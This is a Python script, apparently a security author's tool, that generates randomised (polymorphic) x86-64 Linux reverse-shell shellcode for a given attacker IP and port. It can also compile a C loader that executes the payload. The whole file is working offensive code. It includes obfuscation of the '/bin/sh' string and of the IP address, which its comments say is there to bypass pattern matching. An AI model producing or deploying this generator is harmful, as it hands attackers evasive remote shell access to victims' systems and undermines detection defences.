#!/usr/bin/python3

# Author : Tsmoo / Mathis AYACHE
# Contact : mathisayache@protonmail.com

import os
import sys
import fileinput
import re
import argparse
import random

### Parse the arguments to retrieve the IP address and port
### By default the shellcode is printed on the console / if -f is specified, the shellcode is added in a C file and then compiled.

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip",  type=str,help="Attacker IP address")
parser.add_argument("-p", "--port", type=str, help="Attacker Port")
parser.add_argument("-f", "--file", help="Generate a shellcode in a C compiled file" , action="count",default=0)

args = parser.parse_args()

def summary():
    print('='*70)
    print('\t\t Polymorphic Reverse Shell Generator')
    print('='*70)
    print('[+] Attacker IP : ' + args.ip)
    print('[+] Attacker Port : ' + args.port)
    print('[+] Shellcode size : ' + str(payload_size))


### Function to convert int(IPv4+1) in hex:
def convert(ip):
    ip = ip.split('.')
    for i in range(0,len(ip)):
        ip[i] = int(ip[i])
        ip[i] = ip[i] + 1           ### +1 is to obfuscate the real IP address and to avoid nullbytes / We will substract 1 when we will construct the IP structure for sys_connect.
        ip[i] = hex(ip[i])
        ip[i] = ip[i][2:]
        if len(ip[i]) == 1:
            ip[i] = "0" + ip[i] 
        ip[i] = "\\x" + ip[i]
    ip = ''.join(ip)
    return ip


### Function to convert the specified port in hex
def convert_port(port):
    port = hex(int(port))
    port = port[2:]
    if len(port) % 2 != 0:
        port = "0" + port
    port = "\\x" + port[:2] + "\\x" + port[2:]
    return port


### Socket
rax41 = ["\\xb0\\x30\\x2c\\x07",                        # mov al,0x30 ; sub al,0x7
        "\\xb0\\x15\\x04\\x14",                         # mov al,0x15 ; add al,0x14
        "\\xb0\\x07\\x48\\x6b\\xc0\\x06\\x2c\\x01"]     # mov al,0x7 ; imul rax,0x6 ; sub al,0x1

rdi2 = ["\\x40\\x30\\xff\\x40\\x80\\xc7\\x02",          # xor dil,dil ; add dil,0x2
        "\\x40\\xb7\\x01\\x40\\x80\\xc7\\x01",          # mov dil,0x1 ; add dil,0x1
        "\\x40\\x28\\xff\\x40\\xfe\\xc7\\x40\\xfe\\xc7"]    # sub dil,dil ; inc dil ; inc dil

rsi1 = ["\\x40\\x30\\xf6\\x40\\xb6\\x02\\x40\\xfe\\xce",    # xor sil,sil ; mov sil,0x2 ; dec sil
        "\\x40\\x30\\xf6\\x40\\xfe\\xc6",                   # xor sil,sil ; inc sil
        "\\x40\\x30\\xf6\\x40\\xb6\\x02\\x48\\x6b\\xf6\\x02\\x40\\x80\\xee\\x03"]   # xor sil,sil ; mov sil,0x2 ; imul rsi,0x2 ; sub sil,0x3

rdx0 = ["\\x48\\x31\\xd2",                  # xor rdx,rdx
        "\\x48\\x29\\xd2",                  # sub rdx,rdx
        "\\x48\\x89\\xd3\\x48\\x29\\xda"]   # mov rbx,rdx ; sub rdx,rbx

### Connect 
fd_socket = ["\\x48\\x97",      # xchg rax,rdi
             "\\x48\\x89\\xc7"] # mov rdi,rax

rsi_struct = ["\\xbe" + convert(args.ip) + "\\x48\\x81\\xee\\x01\\x01\\x01\\x01\\x89\\x74\\x24\\xfc\\x66\\xc7\\x44\\x24\\xfa" + convert_port(args.port) + "\\x66\\xc7\\x44\\x24\\xf8\\x02\\x00\\x48\\x83\\xec\\x08\\x48\\x89\\xe6",
              # mov rsi,<IP+1> ; sub rsi,0x01010101 ; mov dword [rsp-4],esi ; mov word [rsp-6],<PORT> ; mov word [rsp-8],0x2 ; sub rsp,8 ; mov rsi,rsp

              "\\x41\\xbc" + convert(args.ip) + "\\x49\\x81\\xec\\x01\\x01\\x01\\x01\\x4d\\x31\\xd2\\x41\\x52\\x41\\x54\\x66\\x68" + convert_port(args.port) + "\\x66\\x6a\\x02\\x54\\x5e",
              # mov r12,<IP+1> ; sub r12,0x01010101 ; push r12 ; push word <PORT> ; push word 0x2 ; push rsp ; pop rsi

              "\\xbb" + convert(args.ip) + "\\x48\\x81\\xeb\\x01\\x01\\x01\\x01\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\\x02" + convert_port(args.port) + "\\x89\\x5c\\x24\\x04\\x48\\x89\\xe6"]
              # mov rbx,<IP+1> ; sub rbx,0x01010101 ; xor r10,r10 ; push r10 ; mov byte [rsp],0x2 ; mov word [rsp+0x2],<PORT> ; mov dword [rsp+0x4],ebx ; mov rsi,rsp

rdx16 = ["\\xb2\\x0f\\xfe\\xc2",            # mov dl,0xf ; inc dl
        "\\xb2\\x11\\xfe\\xca",             # mov dl,0x11 ; dec dl
        "\\xb2\\x08\\x48\\x6b\\xd2\\x02"]   # mov dl,0x8 ; imul rdx,0x2

rax42 = ["\\xb0\\x2b\\xfe\\xc8",            # mov al,0x2b ; dec al
        "\\xb0\\x15\\x48\\x6b\\xc0\\x02",   # mov al,0x15 ; imul rax,0x2
        "\\xb0\\x28\\x04\\x02"]             # mov al,0x28 ; add al,0x2

### Execve
push0 = ["\\x4d\\x31\\xed\\x41\\x55",                                   # xor r13,r13 ; push r13
        "\\x4d\\x29\\xed\\x4c\\x89\\x6c\\x24\\xf8\\x48\\x83\\xec\\x08", # sub r13,r13 ; mov qword [rsp-8],r13 ; sub rsp,0x8
        "\\x4d\\x29\\xdb\\x41\\x53"]                                    # sub r11,r11 ; push r11

rax59 = ["\\xb0\\x3c\\xfe\\xc8",                    # mov al,0x3c ; dec al
        "\\xb0\\x1e\\x48\\x6b\\xc0\\x02\\xfe\\xc8", # mov al,0x1e ; imul rax,0x2 ; dec al
        "\\xb0\\x01\\x04\\x3a"]                     # mov al,0x1 ; add al,0x3a

# 0xa7ea7369866c5f3a XOR 0xcf995c07ef0e7015 = 0x68732f6e69622f2f (//bin/sh)
# 0xb5bde8807c5b294d XOR 0xddcec7ee15390662 = 0x68732f6e69622f2f (//bin/sh)
# To bypass pattern matching, we obfuscated the string //bin/sh so that it doesn't appear in our code.
binsh = ["\\x49\\xbe\\x3a\\x5f\\x6c\\x86\\x69\\x73\\xea\\xa7\\x49\\xbd\\x15\\x70\\x0e\\xef\\x07\\x5c\\x99\\xcf\\x4d\\x31\\xee", # mov r14,0xa7ea7369866c5f3a ; mov r13,0xcf995c07ef0e7015 ; xor r14,r13
        "\\x49\\xbe\\x4d\\x29\\x5b\\x7c\\x80\\xe8\\xbd\\xb5\\x49\\xbd\\x62\\x06\\x39\\x15\\xee\\xc7\\xce\\xdd\\x4d\\x31\\xee"]  # mov r14,0xb5bde8807c5b294d ; mov r13,0xddcec7ee15390662 ; xor r14,r13

pushbinsh = ["\\x41\\x56",  # push r14
             "\\x4c\\x89\\x74\\x24\\xf8\\x48\\x83\\xec\\x08\\x48"]  # mov qword [rsp-8],r14 ; sub rsp,0x8

rdibinsh = ["\\x48\\x89\\xe7",
            "\\x49\\x89\\xe1\\x49\\x87\\xf9"] 
            
rsirdi = ["\\x48\\x89\\x7c\\x24\\xf8\\x48\\x83\\xec\\x08\\x48\\x89\\xe6",
          "\\x57\\x49\\x89\\xe1\\x49\\x87\\xf1"]

### Dup2
rsi0 = "\\x48\\x31\\xf6"                                      # xor rsi,rsi

rsi2 = ["\\x40\\x30\\xf6\\x40\\xb6\\x01\\x40\\xfe\\xc6",        # xor sil,sil ; mov sil,0x1 ; inc sil
        "\\x40\\x30\\xf6\\x40\\x28\\xf6\\x40\\x80\\xc6\\x02",   # xor sil,sil ; sub sil,sil ; add sil,0x2
        "\\x40\\x30\\xf6\\x40\\xb6\\x02"]                       # xor sil,sil; mov sil,0x2

rdi3 = ["\\x40\\xb7\\x02\\x40\\xfe\\xc7",                       # mov dil,0x2 ; inc dil
        "\\x40\\xb7\\x02\\x48\\x6b\\xff\\x02\\x40\\xfe\\xcf",   # mov dil,0x2 ; imul rdi,0x2
        "\\x48\\x29\\xff\\x40\\x80\\xc7\\x03"]                  # sub rdi,rdi ; add dil,0x3

rax33 = ["\\xb0\\x22\\xfe\\xc8",        # mov al,0x22 ; dec al
        "\\xb0\\x0a\\x04\\x17",         # mov al,0xa ; add al,0x17
        "\\x6a\\x21\\x58"]              # push 0x21 ; pop rax

### Exit
rax60 = ["\\xb0\\x14\\x48\\x6b\\xc0\\x03",      # mov al,0x14 ; imul rax,0x3
        "\\xb0\\x3b\\xfe\\xc0",                 # mov al,0x3b ; inc al
        "\\xb0\\x1e\\x48\\x6b\\xc0\\x02"]       # mov al,0x1e ; imul rax,0x2

rdi0 = ["\\x48\\x31\\xff",                      # xor rdi,rdi
        "\\x48\\x29\\xff",                      # sub rdi,rdi
        "\\x48\\x89\\xfb\\x48\\x29\\xdf"]       # mov rbx,rdi ; sub rdi,rbx
        
syscall = "\\x0f\\x05"

socket = [str(random.choice(rax41)), str(random.choice(rdi2)), str(random.choice(rsi1)), str(random.choice(rdx0))]
random.shuffle(socket)
socket.append(str(syscall))
socket.append(str(random.choice(fd_socket)))
socket = ''.join(socket)

connect = [str(random.choice(rsi_struct)),  str(random.choice(rdx16)), str(random.choice(rax42))]
random.shuffle(connect)
connect.append(str(syscall))
connect = ''.join(connect)

dup20 = str(random.choice(rax33)) + str(random.choice(rdi3)) + str(rsi0) + str(syscall)
dup21 = str(random.choice(rax33)) + str(random.choice(rdi3)) + str(random.choice(rsi1)) + str(syscall)
dup22 = str(random.choice(rax33)) + str(random.choice(rdi3)) + str(random.choice(rsi2)) + str(syscall)

execve = str(random.choice(binsh)) + str(random.choice(push0)) + str(random.choice(pushbinsh)) + str(random.choice(rdibinsh)) + str(random.choice(push0)) + str(random.choice(rsirdi)) + str(random.choice(rax59)) + str(random.choice(rdx0)) + str(syscall)

_exit = str(random.choice(rax60)) + str(random.choice(rdi0)) + str(syscall)

payload = socket + connect + dup20 + dup21 + dup22 + execve + _exit

payload_size = payload.count('\\x') 


# Generate binary file if -f argument is specified
if args.file == 1 :
    with open('shellcode.c', 'w+') as file:
        file.write('\
#include <stdio.h>\n\
#include <sys/mman.h>\n\
#include <string.h>\n\
#include <stdlib.h>\n\
\n\
int (*sc)();\n\
\n\
unsigned char buf[] = "'+payload+'";\n\
\n\
int main(int argc, char **argv) {\n\
\n\
    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON\n\
            | MAP_PRIVATE, -1, 0);\n\
\n\
    if (ptr == MAP_FAILED) {\n\
        perror("mmap");\n\
        exit(-1);\n\
    }\n\
\n\
    memcpy(ptr, buf, sizeof(buf));\n\
    sc = ptr;\n\
\n\
    sc();\n\
\n\
    return 0;\n\
}')
        file.close
    os.system('gcc -o shellcode.bin shellcode.c -fno-stack-protector -z execstack') # Compilation with gcc
    summary()
    print('[+] Binary file : ./shellcode.bin')
else :
    summary()
    print('\n')
    print(payload)
